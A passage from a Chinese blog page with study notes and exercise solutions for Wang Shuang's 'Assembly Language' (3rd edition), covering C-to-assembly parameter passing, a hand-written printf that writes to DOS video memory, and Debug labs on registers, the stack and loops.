class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p> showchar函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BP</span>+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0690</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> [<span class="built_in">BX</span>],<span class="built_in">AL</span> <span class="comment">;f函数的第1条语句</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BP</span>+<span class="number">6</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0691</span></span><br><span class="line"><span class="symbol">ES:</span></span><br><span class="line"><span class="keyword">MOV</span> [<span class="built_in">BX</span>],<span class="built_in">AL</span> <span class="comment">;f函数的第2条语句</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p> 答案：<br> main函数通过将对应的参数压栈来给showchar传递参数，并且在函数返回后通过POP操作将参数退栈。<br> showchar通过SS:BP以及寻址在栈中取得对应的参数。</p>
</li>
<li><p>写一个程序B.C：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>,...)</span></span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	showchar(<span class="number">8</span>,<span class="number">2</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'f'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> color,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">0</span>;a!=n;a++)</span><br><span class="line">	&#123;</span><br><span class="line">		*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">80</span>+a+a)=*(<span class="keyword">int</span> *)(_BP+<span class="number">8</span>+a+a);<span class="comment">//加8是因～为call的时候将CS、IP压栈</span></span><br><span class="line"></span><br><span class="line">		*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">81</span>+a+a)=color;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 分析程序B.C，深入理解相关的知识。<br> 思考：showchar函数是如何知道要显示多少个字符的？printf函数是如何知道有多少个参数的？<br> 待显示字符的个数为showchar函数的第一个参数，showchar函数以此得知要显示的字符的个数。<br> 通过对printf的一个参数所指向的字符串的分析，printf函数以此得知参数的个数。</p>
</li>
<li><p>实现一个简单的printf函数，只需支持“%c %d”即可。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> *, ...)</span></span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	myprintf(<span class="string">"%d %c abc %%\n"</span>, <span class="number">-12345</span>, <span class="number">48</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> * str, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> position = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (*str != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (*str == <span class="number">37</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			str++;</span><br><span class="line">			<span class="keyword">if</span> (*str == <span class="number">68</span> || *str == <span class="number">100</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> index;</span><br><span class="line">				<span class="keyword">char</span> flag = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">int</span> num = *(<span class="keyword">int</span> *)(_BP + <span class="number">6</span> + count);</span><br><span class="line">				<span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					flag = <span class="number">1</span>;</span><br><span class="line">					num *= <span class="number">-1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">while</span> (num != <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					num = num / <span class="number">10</span>;</span><br><span class="line">					length++;</span><br><span class="line">				&#125;</span><br><span class="line">				num = *(<span class="keyword">int</span> *)(_BP + <span class="number">6</span> + count);</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">1</span>) num *= <span class="number">-1</span>;</span><br><span class="line">				position += length + flag - <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (index = <span class="number">0</span> ; index &lt; length; ++index)</span><br><span class="line">				&#123;</span><br><span class="line">					*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = num % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">					num = num / <span class="number">10</span>;</span><br><span class="line">					position--;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = <span class="string">'-'</span>;</span><br><span class="line">					position--;</span><br><span class="line">				&#125;</span><br><span class="line">				position += length + flag + <span class="number">1</span>;</span><br><span class="line">				count += <span class="number">2</span>;</span><br><span class="line">				str++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (*str == <span class="number">67</span> || *str == <span class="number">99</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = *(<span class="keyword">char</span> *)(_BP + <span class="number">6</span> + count);</span><br><span class="line">				count++;</span><br><span class="line">				position++;</span><br><span class="line">				str++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = <span class="string">'%'</span>;</span><br><span class="line">				position++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = *str;</span><br><span class="line">			position++;</span><br><span class="line">			str++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/03/10/王爽汇编语言第三版综合研究结论/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/03/09/王爽汇编语言第三版实验/">
                            王爽汇编语言第三版实验
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-03-09T11:42:37+08:00">
	
		    3月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/汇编/">汇编</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第二部分，包括了书本上的实验</p>
</blockquote>
<h2 id="实验1-查看CPU和内存，用机器指令和汇编指令编程"><a href="#实验1-查看CPU和内存，用机器指令和汇编指令编程" class="headerlink" title="实验1 查看CPU和内存，用机器指令和汇编指令编程"></a>实验1 查看CPU和内存，用机器指令和汇编指令编程</h2><ol>
<li><p>使用Debug，将下面的程序段写入内存，逐条执行，观察每条指令执行后，CPU中相关寄存器的变化。<br><table><thead><tr><th style="text-align: center">机器码</th><th style="text-align: center">汇编指令</th><th style="text-align: center">执行后相关寄存器变化</th></tr></thead><tbody><tr><td style="text-align: center">b8 20 4e</td><td style="text-align: center">mov ax, 4E20H</td><td style="text-align: center">AX=4E20H</td></tr><tr><td style="text-align: center">05 16 14</td><td style="text-align: center">add ax, 1416H</td><td style="text-align: center">AX=6236H</td></tr><tr><td style="text-align: center">bb 00 20</td><td style="text-align: center">mov bx, 2000H</td><td style="text-align: center">BX=2000H</td></tr><tr><td style="text-align: center">01 d8</td><td style="text-align: center">add ax, bx</td><td style="text-align: center">AX=8236H</td></tr><tr><td style="text-align: center">89 c3</td><td style="text-align: center">mov bx, ax</td><td style="text-align: center">BX=8236H</td></tr><tr><td style="text-align: center">01 d8</td><td style="text-align: center">add ax, bx</td><td style="text-align: center">AX=046CH</td></tr><tr><td style="text-align: center">b8 1a 00</td><td style="text-align: center">mov ax, 001AH</td><td style="text-align: center">AX=001AH</td></tr><tr><td style="text-align: center">bb 26 00</td><td style="text-align: center">mov bx, 0026H</td><td style="text-align: center">BX=0026H</td></tr><tr><td style="text-align: center">00 d8</td><td style="text-align: center">add al, bl</td><td style="text-align: center">AX=0040H</td></tr><tr><td style="text-align: center">00 dc</td><td style="text-align: center">add ah, bl</td><td style="text-align: center">AX=2640H</td></tr><tr><td style="text-align: center">00 c7</td><td style="text-align: center">add bh, al</td><td style="text-align: center">BX=4026H</td></tr><tr><td style="text-align: center">b4 00</td><td style="text-align: center">mov ah, 0</td><td style="text-align: center">AX=0040H</td></tr><tr><td style="text-align: center">00 d8</td><td style="text-align: center">add al, bl</td><td style="text-align: center">AX=0066H</td></tr><tr><td style="text-align: center">04 9c</td><td style="text-align: center">add al, 9CH</td><td style="text-align: center">AX=0002H</td></tr></tbody></table><br>提示，可用E命令和A命令以两种方式将指令写入内存。注意用T命令执行时，CS:IP的指向。</p>
</li>
<li><p>将下面3条指令写入从2000:0开始的内存单元中，利用这3条指令计算2的8次方。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">jmp</span> <span class="number">2000</span>:<span class="number">0003</span></span><br></pre></td></tr></table></figure>
<p>每次执行 add ax, ax 相当于将ax乘2，重复执行该条指令8次即可。</p>
</li>
<li><p>查看内存中的内容。<br>PC机主板上的ROM写有一个生产日期，在内存FFF00H～FFFFFH的某几个单元中，请找到这个生产日期并试图改变它。<br>提示，如果读者对实验的结果感到疑惑，请仔细阅读第1章中的1.15节。</p>
</li>
</ol>
<p>通过Debug中的D命令，可以观察到生产日期以MM/DD/YY的格式存储在内存的ffff:0005-ffff:000c共计8个字节处。<br>该生产日期不可被修改，因为其只读。</p>
<ol start="4">
<li>向内存从B8100H开始的单元中填写数据，如：<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e B810:<span class="number">0000</span> <span class="number">01</span> <span class="number">01</span> <span class="number">02</span> <span class="number">02</span> <span class="number">03</span> <span class="number">03</span> <span class="number">04</span> <span class="number">04</span></span><br></pre></td></tr></table></figure>
请读者先填写不同的数据，观察产生的现象；再改变填写的地址，观察产生的现象。<br>提示，如果读者对实验的结果感到疑惑，请仔细阅读第1章中的1.15节。</li>
</ol>
<p>通过向内存中的显存地址空间写入数据，控制在屏幕上的不同位置显示不同颜色的字符。</p>
<h2 id="实验2-用机器指令和汇编指令编程"><a href="#实验2-用机器指令和汇编指令编程" class="headerlink" title="实验2 用机器指令和汇编指令编程"></a>实验2 用机器指令和汇编指令编程</h2><ol>
<li><p>使用Debug，将下面的程序段写入内存，逐条执行，根据指令执行后的实验运行情况填空。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, ffff</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2200</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,[<span class="number">0</span>]  <span class="comment">;ax = _____</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>,[<span class="number">2</span>]  <span class="comment">;ax = _____</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,[<span class="number">4</span>]  <span class="comment">;bx = _____</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>,[<span class="number">6</span>]  <span class="comment">;bx = _____</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span>     <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span>     <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span>      <span class="comment">;sp = _____ ax = _____</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span>      <span class="comment">;sp = _____ bx = _____</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> [<span class="number">4</span>]    <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></span><br><span class="line"><span class="keyword">push</span> [<span class="number">6</span>]    <span class="comment">;sp = _____ 修改的内存单元的地址是_____内容为_____</span></span><br></pre></td></tr></table></figure>
<p>结果（不唯一）:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D4EA</span><br><span class="line">25EE</span><br><span class="line"><span class="number">3002</span></span><br><span class="line">5F37</span><br><span class="line">00FE 220FE 25EE</span><br><span class="line">00FC 220FC 5F37</span><br><span class="line">00FE 5F37</span><br><span class="line"><span class="number">0100</span> 25EE</span><br><span class="line">00FE 220FE <span class="number">3002</span></span><br><span class="line">00FC 220FC 2F35</span><br></pre></td></tr></table></figure>
</li>
<li><p>仔细观察图3.19中的实验过程，然后分析：为什么2000:0～2000:f中的内容会发生改变？<br>在使用T命令进行单步追踪的时候，产生了中断，为了保护现场，CPU将PSW、CS和IP依此入栈，导致了内存相关位置内容的改变。</p>
</li>
</ol>
<h2 id="实验3-编程、编译、连接、跟踪"><a href="#实验3-编程、编译、连接、跟踪" class="headerlink" title="实验3 编程、编译、连接、跟踪"></a>实验3 编程、编译、连接、跟踪</h2><ol>
<li><p>将下面的程序保存为t1.asm文件，将其生成可执行文件t1.exe。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line"></span><br><span class="line">codesg <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">sp</span>, <span class="number">10</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit t1.asm</span><br><span class="line">masm.exe t1.asm;</span><br><span class="line">link.exe t1.obj;</span><br></pre></td></tr></table></figure>
</li>
<li><p>用Debug跟踪t1.exe的执行过程，写出每一步执行后，相关寄存器中的内容和栈顶的内容。<br><table><thead><tr><th style="text-align: center">汇编指令</th><th style="text-align: center">相关寄存器的内容</th><th style="text-align: center">栈顶的内容</th></tr></thead><tbody><tr><td style="text-align: center">mov ax, 2000H</td><td style="text-align: center">AX = 2000H</td><td style="text-align: center">00B8H</td></tr><tr><td style="text-align: center">mov ss, ax</td><td style="text-align: center">SS = 2000H</td><td style="text-align: center">&#95;&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">mov sp, 0</td><td style="text-align: center">SP = 0</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">add sp, 10</td><td style="text-align: center">SP = 10</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop ax</td><td style="text-align: center">AX = 0 SP = 12</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop bx</td><td style="text-align: center">BX = 0 SP = 14</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">push ax</td><td style="text-align: center">SP = 12</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">push bx</td><td style="text-align: center">SP = 10</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop ax</td><td style="text-align: center">AX = 0 SP = 12</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">pop bx</td><td style="text-align: center">BX = 0 SP = 14</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">mov ax, 4c00h</td><td style="text-align: center">AX = 4C00H</td><td style="text-align: center">0000H</td></tr><tr><td style="text-align: center">int 21h</td><td style="text-align: center">&#95;&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;&#95;</td></tr></tbody></table><br>结果不唯一</p>
</li>
<li><p>PSP的头两个字节是CD 20，用Debug加载t1.exe，查看PSP的内容。</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-d <span class="number">2119</span>:<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>2119为CS-0010H</p>
</li>
</ol>
<h2 id="实验4-bx-和loop的使用"><a href="#实验4-bx-和loop的使用" class="headerlink" title="实验4 [bx]和loop的使用"></a>实验4 [bx]和loop的使用</h2><ol>
<li><p>编程，向内存0:200～0:23F依此传送数据0～63（3FH）。</p>
</li>
<li><p>编程，向内存0:200～0:23F依此传送数据0～63（3FH），程序中只能使用9条指令，9条指令中包括“mov ax, 4c00h”和“int 21h”。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0020h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> [<span class="built_in">bx</span>], <span class="built_in">bl</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">bl</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</li>
<li><p>下面的程序的功能是将“mov ax, 4c00h”之前的指令复制到内存的0:200处，补全程序，上机调试，跟踪运行结果。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, _____</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0020h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, _____</span><br><span class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code</span><br><span class="line"><span class="number">18H</span></span><br></pre></td></tr></table></figure>
<p>提示：<br>复制的是什么？从哪里到哪里？<br>复制的是代码段中mov ax, 4c00h之前的代码，以数据的形式，从内存中代码段的位置复制到内存中0:200处开始的一段连续的空间。<br>复制的是什么？有多少个字节？你如何直到要复制的字节的数量？<br>可以用offset计算得出，也可以在Debug中用T命令观察得出。</p>
</li>
</ol>
<h2 id="实验5-编写、调试具有多个段的程序"><a href="#实验5-编写、调试具有多个段的程序" class="headerlink" title="实验5 编写、调试具有多个段的程序"></a>实验5 编写、调试具有多个段的程序</h2><ol>
<li><p>将下面的程序编译连接，用Debug加载、跟踪，然后回答问题。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data, <span class="built_in">ss</span>:stack</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span>, <span class="number">0789h</span>, <span class="number">0abch</span>, <span class="number">0defh</span>, <span class="number">0fedh</span>, <span class="number">0cbah</span>, <span class="number">0987h</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span 